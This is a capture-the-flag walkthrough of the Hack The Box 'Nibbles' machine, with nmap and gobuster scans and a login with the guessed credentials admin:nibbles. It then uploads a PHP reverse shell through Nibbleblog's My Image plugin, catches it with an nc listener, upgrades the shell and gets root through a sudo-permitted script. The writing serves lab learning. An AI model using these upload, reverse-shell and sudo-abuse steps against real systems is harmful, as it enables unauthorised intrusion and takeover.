# Hack The Box - Nibbles Walkthrough without Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Nibbles]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.75
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-10 08:01 EST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.99 seconds
                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Nibbles]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.75 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-10 08:01 EST
Nmap scan report for 10.10.10.75
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/10%OT=22%CT=1%CU=43467%PV=Y%DS=2%DC=I%G=Y%TM=63BD61C
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1
OS:1NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.29 seconds
                                                                                                      
```

We get back the following result showing that two ports are open:
- Port `22`: running `OpenSSH 7.2p2`
- Port `80`: running `Apache httpd 2.4.18`

Before starting enumeration, I ran a more comprehensive nmap scan in the background to make sure that I did not miss anything

So I ran an Nmap scan that covers all ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Nibbles]
└─$ sudo nmap -sC -sV -O -p- -oA nmap/full 10.10.10.75
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-10 08:04 EST
Nmap scan report for 10.10.10.75
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/10%OT=22%CT=1%CU=35401%PV=Y%DS=2%DC=I%G=Y%TM=63BD640
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=I%TS=8)SEQ(SP=1
OS:02%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)SEQ(SP=103%GCD=1%ISR=109%TI=Z%II=I%
OS:TS=8)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5
OS:=M539ST11NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=
OS:7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 421.78 seconds

```

Enumeration
Visiting the site in the browser I get nothing useful there, so right click and select View Page Source. We find a comment that gives us a new directory.
![nib-1](https://user-images.githubusercontent.com/87711310/211589782-3ef47f7e-d866-405e-a276-66fab55a9ba7.png)

![nib-2](https://user-images.githubusercontent.com/87711310/211589790-7902583a-2c10-4cf8-b8f7-8c8f98cdff5f.png)

This leads us to the following page. You can see at the bottom that it is powered by Nibbleblog. This is an indication that it an off the shelf software as apposed to custom software.

![nib-3](https://user-images.githubusercontent.com/87711310/211590931-c437de41-21b2-4b57-b645-7854c7aa6d22.png)

Googling `nibbleblog`, I found out that it’s an open-source engine for creating blogs using PHP. This is good news for us for two reasons: (1) you can download the software and play with it offline. This way you can poke at it as much as you want without having to worry about detection, and (2) since it is open-source and used by other people, it probably has reported vulnerabilities. If this was custom software, we would have had to find zero day vulnerabilities.

I decided to enumerate directories using `gobuster`

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Nibbles]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.75/nibbleblog
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.75/nibbleblog
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/10 08:03:47 Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/] 
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]  
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]                                            
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
                                                                                              
===============================================================
2023/01/10 08:49:06 Finished
===============================================================
                                                                     
```

I navigated to `/README` and found out the `Nibbleblog's version` (v4.0.3). So I immediately googled `nibbleblog v4.0.3 exploit` and found out a way to exploit this vulnerability


![nib-4](https://user-images.githubusercontent.com/87711310/211606780-df7ac1fe-837d-42fc-8cec-5c68521cfe74.png)

## Gaining an Initial Foothold

![nib-5](https://user-images.githubusercontent.com/87711310/211736965-4b81f53b-96d0-43c5-a98e-116bfb9b3d31.png)

Several important pieces of information are mentioned in the page.
- It’s a code execution vulnerability.
- The vulnerability is in the `My image` plugin that allows the upload of `PHP` files. So it would allow us to upload a `PHP reverse shell`.
- It’s an authenticated vulnerability which means that we need `admin` credentials before we exploit this vulnerability.


After finding the exploit, my next step was to:
- Navigate to the admin login page and figure out the `admin` credentials
- Navigate to the `My Image` plugin page and upload a PHP reverse shell

The admin page could be found here: 

```
http://10.10.10.75/nibbleblog/admin.php
```

As you can see, we need `admin` credentials to get past this login page. The first thing i try is common credentials (admin:admin, admin:nibbles, nibbles:nibbles, nibbles:admin). If this doesn't work, I look out for default credentials online that are specific to this technology.

In this case, the common credentials thing worked. The credentials were `admin:nibbles` 

Now, I navigated to `my image` plugin. Click on `Plugins -> My Image -> Configure`

![nib-6](https://user-images.githubusercontent.com/87711310/211739404-53f609d3-b731-478a-a467-dbd96ce1164a.png)

I, then, headed over to [Pentestmonkey's website](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) to get the code for a `PHP reverse shell`. 

Change the `IP address` and `port` used by your attack machine. Then save it in a file called `image.php` and upload it on the site.

![nib-7](https://user-images.githubusercontent.com/87711310/211739818-e993b76b-3f8a-40bf-a070-9a7586b3f61f.png)

I, then, started a listener on above chose port
```
nc -lvnp 4444
```

Then, I navigated to image I just uploaded to run the reverse shell
```
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
```

And, I got a low privileged shell

```bash
┌──(darshan㉿kali)-[~/Desktop]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.75] 55268
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 02:07:48 up 18:06,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
nibbler
```

I tried to upgrade to a better shell using `python3`:
```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell and through this i could get the `user` flag

```
$ pwd
/
$ cd ..
$ cd home
$ ls
nibbler
$ cd nibbler
$ ls
personal
personal.zip
user.txt
$ cat user.txt
[REDACTED]
```


## Privilege Escalation

Now, we need to escalate privileges and to find out what privileges i had, I used the `sudo -l` commnad

```
nibbler@Nibbles:/$ sudo -l                                                                                                                                                   
Matching Defaults entries for nibbler on Nibbles:                                                                                                           
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                       
                                                                                                                                                            
User nibbler may run the following commands on Nibbles:                                                                                                     
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh 
```

I could run the script `monitor.sh` in the above specified directory as a `root` without having to enter a `root` password.

First, I tried to look at the contents of the script

```
$ cat home/nibbler/personal/stuff/monitor.sh  
cat: home/nibbler/personal/stuff/monitor.sh: No such file or directory   
```
 It doesn't exist, so I gues I had to create one.
 
 ```
mkdir -p home/nibbler/personal/stuff
cd /home/nibbler/personal/stuff
vi monitor.sh
```

And in the `monitor.sh` script, I added the following code.
```
#!/bin/sh
bash
```

Made it executable and ran the script.
```
chmod +x monitor.sh
```

```
sudo ./monitor.sh
```

And we're root!!!

```
root@Nibbles:/home/nibbler/personal/stuff# whoami
root
```

And we can grab the root flag
```
root@Nibbles:/home/nibbler/personal/stuff# cat /root/root.txt
[REDACTED]
```
